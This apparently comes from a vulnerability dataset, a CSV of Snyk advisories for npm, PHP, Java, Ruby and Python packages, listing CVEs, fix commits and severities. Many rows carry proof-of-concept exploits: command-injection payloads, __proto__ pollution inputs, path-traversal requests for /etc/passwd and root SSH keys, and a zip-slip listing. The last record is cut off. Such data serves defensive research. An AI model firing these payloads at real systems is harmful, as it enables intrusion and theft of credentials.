CVE-2020-7613,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-CLAMSCAN-564113,01/04/2020,01/04/2020,https://github.com/kylefarris/clamscan/commit/5f557c970817fe8c578ec3f7ad3bcbcef4cf5538,Command Injection,https://api.github.com/repos/kylefarris/clamscan/commits/5f557c970817fe8c578ec3f7ad3bcbcef4cf5538,Kyle Farris,kylefarris@gmail.com,clamscan,5f557c970817fe8c578ec3f7ad3bcbcef4cf5538,"Merge pull request #45 from 418sec/master

huntr.dev - Command Injection Fix",JavaScript,3.6,low,"clamscan is an Use Node JS to scan files on your server with ClamAV's clamscan binary or clamdscan daemon. This is especially useful for scanning uploaded files provided by un-trusted sources.
Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands as part of the _is_clamav_binary function located within Index.js. 
It should be noted that this vulnerability requires a pre-requisite that a folder should be created with the same command that will be chained to execute. This lowers the risk of this issue. 
PoC by Snyk
var Root = require(""clamscan"");
var fs = require(""fs"");
var attack_code = ""echo vulnerable > create.txt"";
var root = new Root();
fs.mkdir(attack_code + ""&"", function(){});
root.init({""clamscan"": {'path': attack_code + ""&""}});",2020
CVE-2019-10799,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-COMPILESASS-551804,21/02/2020,21/02/2020,https://github.com/eiskalteschatten/compile-sass/commit/d9ada7797ff93875b6466dea7a78768e90a0f8d2,Command Injection,https://api.github.com/repos/eiskalteschatten/compile-sass/commits/d9ada7797ff93875b6466dea7a78768e90a0f8d2,Alex,alex@alexseifert.com,compile-sass,d9ada7797ff93875b6466dea7a78768e90a0f8d2,Fix a security vulnerability,Markdown,8.2,high,"compile-sass is a module to compile SASS on-the-fly and/or save it to CSS files.
Affected versions of this package are vulnerable to Command Injection. The function setupCleanupOnExit(cssPath) within dist/index.js is executed as part of the rm command without any sanitization.
PoC by JHU System Security Lab
function sleep(millis) {
    return new Promise(resolve => setTimeout(resolve, millis));
}
async function main(){
    var a = require('compile-sass');
    a.setupCleanupOnExit('& touch JHU.txt');
    console.log('Press Ctrl-C in 3 seconds...')
    await sleep(3000);
}
main();",2020
,CWE-347,Snyk,https://security.snyk.io/vuln/SNYK-JS-ELECTRONUPDATER-561421,27/03/2020,17/02/2020,https://github.com/electron-userland/electron-builder/commit/dead150769463adbff38b19e9099df6547db0e24,Signature Validation Bypass,https://api.github.com/repos/electron-userland/electron-builder/commits/dead150769463adbff38b19e9099df6547db0e24,Vladimir Krivosheev,vladimir.krivosheev@jetbrains.com,electron-builder,dead150769463adbff38b19e9099df6547db0e24,"fix(electron-updater): Forbid using of quotes in a file names.

Thanks to [Doyensec](https://doyensec.com/).",Markdown,6.5,medium,"electron-updater is a module allowing applications to implement auto-update functionality.
Affected versions of this package are vulnerable to Signature Validation Bypass. The signature verification check is based on a string comparison between the installed binary’s publisherName and the certificate’s Common Name attribute of the update binary. During a software update, the application will request a file named latest.yml from the update server, which contains the definition of the new release - including the binary filename and hashes.
Using a filename containing a single quote and a matching hash, an attacker could bypass the entire signature verification by triggering a parse error in the script. 
This can be leveraged to force a malicious update on Windows clients, effectively gaining code execution and persistence capabilities.
Exploitation of this vulnerability requires the attacker to also have control over the update server, or alternatively a man-in-the-middle.",2020
CVE-2020-7611,CWE-113,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOMICRONAUT-561342,26/03/2020,26/03/2020,https://github.com/micronaut-projects/micronaut-core/commit/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1,HTTP Request Header Injection,https://api.github.com/repos/micronaut-projects/micronaut-core/commits/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1,jameskleeh,james.kleeh@gmail.com,micronaut-core,9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1,Validate client headers,Java,5.6,medium,"io.micronaut:micronaut-http-client is a modern, JVM-based, full stack microservices framework designed for building modular, easily testable microservice applications.
Affected versions of this package are vulnerable to HTTP Request Header Injection due to not validating request headers passed to the client.",2020
,CWE-23,Snyk,https://security.snyk.io/vuln/SNYK-JS-SAPPER-561051,24/03/2020,24/03/2020,https://github.com/sveltejs/sapper/commit/63ffe9043170fbed8a5d260decfdc05e4440a555,Directory Traversal,https://api.github.com/repos/sveltejs/sapper/commits/63ffe9043170fbed8a5d260decfdc05e4440a555,Conduitry,git@chor.date,sapper,63ffe9043170fbed8a5d260decfdc05e4440a555,fix vulnerability when serving /client/... files,TypeScript,8.6,high,"sapper is a framework for building high-performance universal web apps.
Affected versions of this package are vulnerable to Directory Traversal.
when serving /client/... files.
###PoC by Daniel Thompson:
curl https://vulnerable.server.com/client/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd

##Details:
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.
Directory Traversal vulnerabilities can be generally divided into two types:

Information Disclosure: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

st is a module for serving static files on web pages, and contains a vulnerability of this type. In our example, we will serve files from the public route.
If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa

Note %2e is the URL encoded version of . (dot).

Writing arbitrary files: Allows the attacker to create or replace existing files. This type of vulnerability is also known as Zip-Slip.

One way to achieve this is by using a malicious zip archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys",2020
CVE-2019-10797,CWE-113,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGWSO2TRANSPORTHTTP-548944,18/02/2020,18/02/2020,https://github.com/wso2/transport-http/commit/4a4dc99c7b259646ee5e23b7aaa7c3a8bac959c1#diff-d52aeea88ecf58ca81ed1a5633762b13,HTTP Response Splitting,https://api.github.com/repos/wso2/transport-http/commits/4a4dc99c7b259646ee5e23b7aaa7c3a8bac959c1#diff-d52aeea88ecf58ca81ed1a5633762b13,chamil321,chamilmadawa8@gmail.com,transport-http,4a4dc99c7b259646ee5e23b7aaa7c3a8bac959c1,Add HTTP header Validation,Java,6.3,medium,"org.wso2.transport.http:org.wso2.transport.http.netty is a HTTP protocol handling implementations for C5 based products.
Affected versions of this package are vulnerable to HTTP Response Splitting due to HTTP Header validation being disabled.",2020
CVE-2020-7597,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-CODECOV-548879,16/02/2020,16/02/2020,https://github.com/codecov/codecov-node/commit/02cf13d8b93ac547b5b4c2cfe186b7d874fd234f,Command Injection,https://api.github.com/repos/codecov/codecov-node/commits/02cf13d8b93ac547b5b4c2cfe186b7d874fd234f,Joe Becher,drazisil@users.noreply.github.com,codecov-node,02cf13d8b93ac547b5b4c2cfe186b7d874fd234f,"[CE-1330] Escaping args (#167)

* Escaping args",Unknown,6.5,medium,"codecov is a npm package for uploading reports to Codecov.
Affected versions of this package are vulnerable to Command Injection. The value provided as part of the gcov-root argument is executed by the exec function within lib/codecov.js. This vulnerability exists due to an incomplete fix of CVE-2020-7596.
PoC by JHU System Security Lab
var root = require(""codecov"");
var args = {
  ""options"": {
    'gcov-root': ""& touch exploit &"",
    'gcov-exec': ' ',
    'gcov-args': ' '
  }
}
root.handleInput.upload(args, function(){}, function(){});",2020
CVE-2019-10795,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940,18/02/2020,18/02/2020,https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822,Prototype Pollution,https://api.github.com/repos/remy/undefsafe/commits/f272681b3a50e2c4cbb6a8533795e1453382c822,Remy Sharp,remy@remysharp.com,undefsafe,f272681b3a50e2c4cbb6a8533795e1453382c822,fix: prevent changes in prototype chain,JavaScript,6.3,medium,"undefsafe is a Simple function for retrieving deep object properties without getting ""Cannot read property 'X' of undefined"".
Affected versions of this package are vulnerable to Prototype Pollution. The a function could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.
PoC by JHU System Security Lab
var a = require(""undefsafe"");
var payload = ""__proto__.toString"";
a({},payload,""JHU"");
console.log({}.toString);",2020
CVE-2019-10793,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOTOBJECT-548905,17/02/2020,17/02/2020,https://github.com/rhalff/dot-object/commit/f76cff5fe6d01d30ce110d8f454db2e5bd28a7de,Prototype Pollution,https://api.github.com/repos/rhalff/dot-object/commits/f76cff5fe6d01d30ce110d8f454db2e5bd28a7de,Rob Halff,rob.halff@gmail.com,dot-object,f76cff5fe6d01d30ce110d8f454db2e5bd28a7de,guard for possible prototype polution,JavaScript,6.3,medium,"dot-object is a module that makes it possible to transform javascript objects using dot notation.
Affected versions of this package are vulnerable to Prototype Pollution. The set function could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.
PoC by JHU System Security Lab
var a = require(""dot-object"")
var path = ""__proto__"";
var val = {toString:""JHU""}
a.set(path,val,{},true);
console.log({}.toString);",2020
CVE-2019-10792,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-BODYMEN-548897,17/02/2020,17/02/2020,https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b,Prototype Pollution,https://api.github.com/repos/diegohaz/bodymen/commits/5d52e8cf360410ee697afd90937e6042c3a8653b,Haz,hazdiego@gmail.com,bodymen,5d52e8cf360410ee697afd90937e6042c3a8653b,"Fix prototype pollution vulnerability (#23)

* Fix prototype pollution vulnerability

* Update .travis.yml",Config files,6.3,medium,"bodymen is a Body parser middleware for MongoDB, Express and Nodejs.
Affected versions of this package are vulnerable to Prototype Pollution. The handler function could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.
PoC by JHU System Security Lab
var a = require(""undefsafe"");
var payload = ""__proto__.toString"";
a({},payload,""JHU"");
console.log({}.toString);",2020
,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CHUMPERZIPPER-552162,25/02/2020,25/02/2020,https://github.com/Chumper/Zipper/commit/d15207e010f8fe1bdd341376bd86d599c4166423,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/Chumper/Zipper/commits/d15207e010f8fe1bdd341376bd86d599c4166423,Sam Sanoop,sams@snyk.io,Zipper,d15207e010f8fe1bdd341376bd86d599c4166423,"Prevent Zip Traversal Attacks (#156)

Checks for special characters within filenames within a ZIP file using strpos comparison",PHP,7.7,high,"chumper/zipper is a little neat helper for the ZipArchive methods with handy functions.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). ZIP Path traversal is possible during extraction due to no validation and sanitization of filenames.
PoC by Snyk
<?php
require __DIR__ . '/vendor/autoload.php';
$zipper = new \Chumper\Zipper\Zipper;

$zipper->make('/archives/zip-slip.zip')->extractTo('/uploads');
$zipper->close();",2020
,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DARIUSIIIZIPPER-552163,25/02/2020,25/02/2020,https://github.com/Chumper/Zipper/commit/d15207e010f8fe1bdd341376bd86d599c4166423,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/Chumper/Zipper/commits/d15207e010f8fe1bdd341376bd86d599c4166423,Sam Sanoop,sams@snyk.io,Zipper,d15207e010f8fe1bdd341376bd86d599c4166423,"Prevent Zip Traversal Attacks (#156)

Checks for special characters within filenames within a ZIP file using strpos comparison",PHP,7.7,high,"dariusiii/zipper is a Simple Wrapper around the ZipArchive methods with some handy functions. This package is an updated fork of Chumper/Zipper.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). ZIP Path traversal is possible during extraction due to no validation and sanitization of filenames.
PoC by Snyk
<?php
require __DIR__ . '/vendor/autoload.php';
$zipper = new \Chumper\Zipper\Zipper;

$zipper->make('/archives/zip-slip.zip')->extractTo('/uploads');
$zipper->close();",2020
,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MADNESTMADZIPPER-552164,25/02/2020,25/02/2020,https://github.com/Chumper/Zipper/commit/d15207e010f8fe1bdd341376bd86d599c4166423,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/Chumper/Zipper/commits/d15207e010f8fe1bdd341376bd86d599c4166423,Sam Sanoop,sams@snyk.io,Zipper,d15207e010f8fe1bdd341376bd86d599c4166423,"Prevent Zip Traversal Attacks (#156)

Checks for special characters within filenames within a ZIP file using strpos comparison",PHP,7.7,high,"madnest/madzipper is a Wannabe successor of Chumper/Zipper package for Laravel.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). ZIP Path traversal is possible during extraction due to no validation and sanitization of filenames.
PoC by Snyk
<?php
require __DIR__ . '/vendor/autoload.php';
$zipper = new \Chumper\Zipper\Zipper;

$zipper->make('/archives/zip-slip.zip')->extractTo('/uploads');
$zipper->close();",2020
CVE-2019-10800,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-CODECOV-552149,25/02/2020,25/02/2020,https://github.com/codecov/codecov-python/commit/2a80aa434f74feb31242b6f213b75ce63ae97902,Command Injection,https://api.github.com/repos/codecov/codecov-python/commits/2a80aa434f74feb31242b6f213b75ce63ae97902,Joe Becher,jwbecher@drazisil.com,codecov-python,2a80aa434f74feb31242b6f213b75ce63ae97902,CE-1380_sanitize_args,Python,6.5,medium,"codecov is a Python report uploader for Codecov.
Affected versions of this package are vulnerable to Command Injection. The vulnerability occurs due to not sanitizing gcov arguments before being being provided to the popen method.
PoC by Snyk
codecov --gcov-args='& echo test > vuln1.txt' --gcov-exec='& echo test > vuln2.txt' --gcov-root='& echo test > vuln3.txt' -t foobar",2020
CVE-2020-7600,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-QUERYMEN-559867,12/03/2020,12/03/2020,https://github.com/diegohaz/querymen/commit/1987fefcb3b7508253a29502a008d5063a873cef,Prototype Pollution,https://api.github.com/repos/diegohaz/querymen/commits/1987fefcb3b7508253a29502a008d5063a873cef,Haz,hazdiego@gmail.com,querymen,1987fefcb3b7508253a29502a008d5063a873cef,"Fix prototype pollution vulnerability (#77)

* Fix prototype pollution vulnerability

* Fix test",Config files,5.9,medium,"querymen is a Querystring parser middleware for MongoDB, Express and Nodejs.
Affected versions of this package are vulnerable to Prototype Pollution. The parameters of exported function handler(type, name, fn) can be controlled by users without any sanitization. This could be abused for Prototype Pollution attacks.
PoC by System Security Lab
var a = require(""querymen"");
a.handler(""__proto__"",""toString"",""JHU"");
console.log({}.toString);",2020
CVE-2020-5258,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOJO-559224,12/03/2020,05/03/2020,https://github.com/dojo/dojo/commit/20a00afb68f5587946dc76fbeaa68c39bda2171d,Prototype Pollution,https://api.github.com/repos/dojo/dojo/commits/20a00afb68f5587946dc76fbeaa68c39bda2171d,Nick Nisi,nick@nisi.org,dojo,20a00afb68f5587946dc76fbeaa68c39bda2171d,Merge pull request from GHSA-jxfh-8wgv-vfr2,JavaScript,4.2,medium,"dojo is a foundation package for the Dojo 1 Toolkit. While still being maintained, new development is primarily focused on modern Dojo.
Affected versions of this package are vulnerable to Prototype Pollution. The deepCopy method within dojo could be tricked into adding or modifying properties of Object.prototype 
PoC by Snyk
    require([""dojo/request/util""], function(lang) {
        var malicious_payload = '{""__proto__"":{""vulnerable"":""Polluted""}}';
        var a = { b: ""c"", d: ""e"" };
        var newOjb = lang.deepCopy(a, JSON.parse(malicious_payload));
        console.log({}.vulnerable);

  })",2020
CVE-2019-10808,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-UTILITIFY-559497,07/03/2020,07/03/2020,https://github.com/xcritical-software/utilitify/commit/88d6e27009823338bf319ffb768fe6b08e8ad2d1,Prototype Pollution,https://api.github.com/repos/xcritical-software/utilitify/commits/88d6e27009823338bf319ffb768fe6b08e8ad2d1,Mikhail Andreev,tundraray@outlook.com,utilitify,88d6e27009823338bf319ffb768fe6b08e8ad2d1,"Merge pull request #22 from xcritical-software/fix/merge_prototype_pollution

fix(mergeDeep): do not merge __proto__ property",Config files,4.2,medium,"utilitify is a the utilities for working with a collections such as objects, arrays and primitives such as numbers, strings, etc.
Affected versions of this package are vulnerable to Prototype Pollution. The merge method could be tricked into adding or modifying properties of Object.prototype 
PoC
import { mergeDeep } from 'utilitify';
var malicious_payload = '{""__proto__"":{""vulnerable"":""Polluted""}}';
var result = mergeDeep({ a: { b: { c: 'c', d: 'd' } } }, { a: { b: JSON.parse(malicious_payload) } });
console.log({}.vulnerable);",2020
CVE-2019-10807,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-BLAMER-559541,09/03/2020,09/03/2020,https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c,Command Injection,https://api.github.com/repos/kucherenko/blamer/commits/5fada8c9b6986ecd28942b724fa682e77ce1e11c,Andrey Kucherenko,kucherenko.andrey@gmail.com,blamer,5fada8c9b6986ecd28942b724fa682e77ce1e11c,fix(root): Rewrite the project with typescript and fix issue with security of script execution,Config files,5.9,medium,"blamer is a tool for get information about author of code from version control system. Supports git and subversion.
Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands as part of the arguments provided to blamer.
PoC
var Root = require(""blamer"");
var attack_command = ""& touch vulnerable &"";
root = new Root('git',attack_command);
root.blameByFile(""./"");",2020
CVE-2019-10806,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-VEGAUTIL-559223,06/03/2020,05/03/2020,https://github.com/vega/vega/commit/8f33a0b5170d7de4f12fc248ec0901234342367b,Prototype Pollution,https://api.github.com/repos/vega/vega/commits/8f33a0b5170d7de4f12fc248ec0901234342367b,Jeffrey Heer,jheer@trifacta.com,vega,8f33a0b5170d7de4f12fc248ec0901234342367b,Fix prototype pollution in mergeConfig.,JavaScript,4.2,medium,"vega-util is a JavaScript utilities package for Vega.
Affected versions of this package are vulnerable to Prototype Pollution. The vega.mergeConfig method within vega-util could be tricked into adding or modifying properties of Object.prototype.
PoC by Snyk
var util = require('vega-util')
var config = '{style: {point: {shape: triangle-right}}}'
var malicious_payload = '{""__proto__"":{""vulnerable"":""Polluted""}}';

  var c = util.mergeConfig(
    config,
    JSON.parse(malicious_payload)
  );
console.log({}.vulnerable);",2020
CVE-2020-7610,CWE-642,Snyk,https://security.snyk.io/vuln/SNYK-JS-BSON-561052,24/03/2020,24/03/2020,https://github.com/mongodb/js-bson/commit/3809c1313a7b2a8001065f0271199df9fa3d16a8,Internal Property Tampering,https://api.github.com/repos/mongodb/js-bson/commits/3809c1313a7b2a8001065f0271199df9fa3d16a8,Dan Aprahamian,dan.aprahamian@gmail.com,js-bson,3809c1313a7b2a8001065f0271199df9fa3d16a8,"fix: throw if invalid _bsontype is detected

If an invalid value for `_bsontype` is encountered during object
serialization, the serializer will now throw an error rather than
skipping the value completely.

NODE-2514",JavaScript,8.1,high,"bson is a BSON Parser for node and browser.
Affected versions of this package are vulnerable to Internal Property Tampering. The package will ignore an unknown value for an object's _bsotype, leading to cases where an object is serialized as a document rather than the intended BSON type.",2020
CVE-2020-7609,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODERULES-560426,17/03/2020,10/03/2020,https://github.com/mithunsatheesh/node-rules/commit/100862223904bb6478fcc33b701c7dee11f7b832,Arbitrary Code Execution,https://api.github.com/repos/mithunsatheesh/node-rules/commits/100862223904bb6478fcc33b701c7dee11f7b832,Mithun Satheesh,mithunsatish@gmail.com,node-rules,100862223904bb6478fcc33b701c7dee11f7b832,"Remove fromJSON and toJSON from exposed APIs

Remove fromJSON and toJSON from exposed APIs in V5.0.0",JavaScript,8.1,high,"node-rules is a light weight forward chaining Rule Engine, written in JavaScript.
Affected versions of this package are vulnerable to Arbitrary Code Execution. The injection point is located in line 152,153. The argument rules of function fromJSON() can be controlled by users without any sanitization.",2020
CVE-2020-7608,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-YARGSPARSER-560381,16/03/2020,16/03/2020,https://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2,Prototype Pollution,https://api.github.com/repos/yargs/yargs-parser/commits/63810ca1ae1a24b08293a4d971e70e058c7a41e2,Benjamin E. Coe,bencoe@google.com,yargs-parser,63810ca1ae1a24b08293a4d971e70e058c7a41e2,fix: __proto__ will now be replaced with ___proto___ in parse (#258),JavaScript,5.6,medium,"yargs-parser is a mighty option parser used by yargs.
Affected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.
Our research team checked several attack vectors to verify this vulnerability:

It could be used for privilege escalation.
The library could be used to parse user input received from different sources:
terminal emulators
system calls from other code bases
CLI RPC servers",2020
CVE-2019-10791,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-PROMISEPROBE-546816,06/02/2020,04/02/2020,https://github.com/dottgonzo/node-promise-probe/commit/0d9affb67fc1ad985903536d35372cf55efe5a45,Command Injection,https://api.github.com/repos/dottgonzo/node-promise-probe/commits/0d9affb67fc1ad985903536d35372cf55efe5a45,dario,dario@workstation.borgo33.caruso.online,node-promise-probe,0d9affb67fc1ad985903536d35372cf55efe5a45,resolve vulnerability,JavaScript,7.5,high,"promise-probe is a FFprobe wrapper.
Affected versions of this package are vulnerable to Command Injection via the ffprobe(file) and createMuteOgg(outputFile, options) functions.
file,outputFile,options can be controlled by users without any sanitization
PoC by JHU System Security Lab
var root = require(""promise-probe"");

root.ffprobe(""& touch JHU"");
root.createMuteOgg(""123"",{seconds:""& touch JHU &""});
root.createMuteOgg(""& touch JHU"",{});",2020
CVE-2019-15605,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-COCOAPODS-SWIFTNIOHTTP1-5721881,06/02/2020,06/02/2020,https://github.com/nodejs/node/commit/eea3a7429b,HTTP Request Smuggling,https://api.github.com/repos/nodejs/node/commits/eea3a7429b,Sam Roberts,vieuxtech@gmail.com,node,eea3a7429bd91d1ed69b8364abecf06694661ac1,"test: using TE to smuggle reqs is not possible

See: https://hackerone.com/reports/735748

PR-URL: https://github.com/nodejs-private/node-private/pull/199
Reviewed-By: Sam Roberts <vieuxtech@gmail.com>",JavaScript,10.0,critical,"SwiftNIOHTTP1 is a cross-platform asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers & clients.
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP request smuggling is possible using malformed Transfer-Encoding header.",2020
CVE-2019-15605,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-SWIFT-APPLESWIFTNIO-3105797,06/02/2020,06/02/2020,https://github.com/nodejs/node/commit/eea3a7429b,HTTP Request Smuggling,https://api.github.com/repos/nodejs/node/commits/eea3a7429b,Sam Roberts,vieuxtech@gmail.com,node,eea3a7429bd91d1ed69b8364abecf06694661ac1,"test: using TE to smuggle reqs is not possible

See: https://hackerone.com/reports/735748

PR-URL: https://github.com/nodejs-private/node-private/pull/199
Reviewed-By: Sam Roberts <vieuxtech@gmail.com>",JavaScript,10.0,critical,"apple/swift-nio is an event-driven network application framework for high performance protocol servers & clients, non-blocking.
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP request smuggling is possible using malformed Transfer-Encoding header.",2020
CVE-2019-10787,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-IMRESIZE-544183,04/02/2020,04/02/2020,https://github.com/Turistforeningen/node-im-resize/commit/de624dacf6a50e39fe3472af1414d44937ce1f03,Command Injection,https://api.github.com/repos/Turistforeningen/node-im-resize/commits/de624dacf6a50e39fe3472af1414d44937ce1f03,Sam Sanoop,sams@snyk.io,node-im-resize,de624dacf6a50e39fe3472af1414d44937ce1f03,"fix: check image arguments before processing (#19)

Regex hotfix to check for command injection",JavaScript,7.5,high,"im-resize is an efficient image resize with support for multiple thumbnail configurations using ImageMagick's convert command.
Affected versions of this package are vulnerable to Command Injection. The cmd argument used within  index.js, can be controlled by user without any sanitization.
PoC by JHU System Security Lab
var root = require('im-resize')
var image = {
""path"": ""& echo vulnerable > create.txt &""

}
var output ={
""versions"":[]
}
root(image,output,function(){});",2020
CVE-2019-10788,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-IMMETADATA-544184,04/02/2020,04/02/2020,https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,Command Injection,https://api.github.com/repos/Turistforeningen/node-im-metadata/commits/ea15dddbe0f65694bfde36b78dd488e90f246639,Sam Sanoop,sams@snyk.io,node-im-metadata,ea15dddbe0f65694bfde36b78dd488e90f246639,"fix: check path argument before processing (#10)

hotfix to re mediate command injection",JavaScript,7.5,high,"im-metadata is a package to retrieve image metadata as a JSON object using ImageMagick's identify command.
Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands as part of the metadata options which is given to the exec function.
PoC by Snyk Security Team
var metadata = require('im-metadata');

metadata('/home/snoopy/Pictures/Screenshots/foo.jpg;ls', {exif: true}, function(error, metadata) {
    if (error) { console.error(error); }
    console.log(metadata);
    console.log(metadata.exif);
  });",2020
CVE-2019-10781,CWE-642,Snyk,https://security.snyk.io/vuln/SNYK-JS-SCHEMAINSPECTOR-536970,20/01/2020,27/11/2019,https://github.com/Atinux/schema-inspector/commit/345a7b2eed11bb6128421150d65f4f83fdbb737d,Internal Property Tampering,https://api.github.com/repos/Atinux/schema-inspector/commits/345a7b2eed11bb6128421150d65f4f83fdbb737d,Sébastien Chopin,seb@nuxtjs.com,schema-inspector,345a7b2eed11bb6128421150d65f4f83fdbb737d,fix: Issue #75,JavaScript,7.5,high,"schema-inspector is a JSON API sanitisation and validation module.
Affected versions of this package are vulnerable to Internal Property Tampering. A maliciously crafted JavaScript object can bypass the sanitize() and the validate() function used within schema-inspector.",2020
CVE-2019-10780,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-BIBTEXRUBY-542602,17/01/2020,17/01/2020,https://github.com/inukshuk/bibtex-ruby/commit/14406f4460f4e1ecabd25ca94f809b3ea7c5fb11,Command Injection,https://api.github.com/repos/inukshuk/bibtex-ruby/commits/14406f4460f4e1ecabd25ca94f809b3ea7c5fb11,Sylvester Keil,sylvester@keil.or.at,bibtex-ruby,14406f4460f4e1ecabd25ca94f809b3ea7c5fb11,"Use File.read instead of Kernel.open

To avoid command injection with | strings",Ruby,9.8,critical,"bibtex-ruby is a BibTeX library, parser, and converter for Ruby.
Affected versions of this package are vulnerable to Command Injection due to unsanitized user input being passed directly to the built-in dangerous Ruby Kernel.open method through BibTeX.open.",2020
CVE-2019-10775,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-ECSTATIC-540354,31/12/2019,31/12/2019,https://github.com/jfhbrook/node-ecstatic/commit/72044b89941ada4a5e864d77257b4efb20aef498,Denial of Service (DoS),https://api.github.com/repos/jfhbrook/node-ecstatic/commits/72044b89941ada4a5e864d77257b4efb20aef498,M.K,mk-pmb@users.noreply.github.com,node-ecstatic,72044b89941ada4a5e864d77257b4efb20aef498,"v4.1.3: [security] Fix crash on redirect with formfeed in URL (CVE-2019-10775) (#266)

* [minor] Remove else-after-return to make eslint pass

* v4.1.3: [security] Fix crash on redirect with formfeed in URL (CVE-2019-10775)

This fixes CVE-2019-10775. I'll postpone regression tests because
the request library cannot send those requests (crashing the client
instead of ecstatic), so I'll need to find another module that can.",JavaScript,7.5,high,"ecstatic is a simple static file server middleware. Use it with a raw http server, express/connect or on the CLI.
Affected versions of this package are vulnerable to Denial of Service (DoS). It is possible to crash a server using the package due to the way URL params parsing is handled during redirect.
PoC
curl --path-as-is $(echo -e -n ""http://127.0.0.1:8080/existing-dir-name?\x0cfoo"")

In the PoC the library is trying to redirect /existing-dir-name?\x0cfoo to /existing-dir-name/?\x0cfoo which cause TypeError: The header content contains invalid characters error because of \x0c symbol.",2019
CVE-2019-10778,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-DEVCERTSANSCACHE-540926,08/01/2020,08/01/2020,https://github.com/guybedford/devcert/commit/571f4e6d077f7f21c6aed655ae380d85a7a5d3b8,Command Injection,https://api.github.com/repos/guybedford/devcert/commits/571f4e6d077f7f21c6aed655ae380d85a7a5d3b8,Guy Bedford,guybedford@gmail.com,devcert,571f4e6d077f7f21c6aed655ae380d85a7a5d3b8,common name sanitization,TypeScript,7.5,high,"devcert-sanscache is a package that can be used to generate trusted local SSL/TLS certificates for local SSL development.
Affected versions of this package are vulnerable to Command Injection. The variable commonName controlled by user input is used as part of the  exec function without any sanitization. 
PoC by JHU System Security Lab
var root = require(""devcert-sanscache"");
var attack_code = ""&touch Song&"";
root(attack_code);",2020
CVE-2019-10776,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-GITDIFFAPPLY-540774,06/01/2020,06/01/2020,https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,Command Injection,https://api.github.com/repos/kellyselden/git-diff-apply/commits/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,Kelly Selden,kellyselden@gmail.com,git-diff-apply,106d61d3ae723b4257c2a13e67b95eb40a27e0b5,"spawn git clone

